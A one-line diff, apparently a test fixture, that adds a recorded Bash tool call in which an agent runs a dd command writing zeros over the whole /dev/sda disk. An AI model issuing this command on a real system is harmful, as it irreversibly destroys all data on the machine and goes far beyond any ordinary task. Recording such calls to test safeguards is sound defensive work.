@@ -1,0 +1,1 @@
+{"type":"tool_use","id":"toolu_22","name":"Bash","input":{"command":"dd if=/dev/zero of=/dev/sda bs=4M status=progress"}}
